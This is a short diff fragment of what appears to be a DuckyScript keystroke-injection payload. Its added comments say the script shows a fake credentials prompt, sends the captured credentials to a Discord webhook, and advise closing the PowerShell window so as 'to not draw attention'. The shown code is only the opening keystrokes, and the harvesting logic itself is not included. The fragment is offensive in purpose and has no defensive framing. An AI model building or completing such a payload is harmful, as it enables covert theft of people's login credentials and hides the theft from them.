@@ -1,3 +1,5 @@
+REM This script pops up a credentials box to gather the user credentials and sends them to a discord webhook
+REM Be sure to exit out of the powershell script that ran the code after completion as to not draw attention
 DELAY 500
 GUI r
 DELAY 500
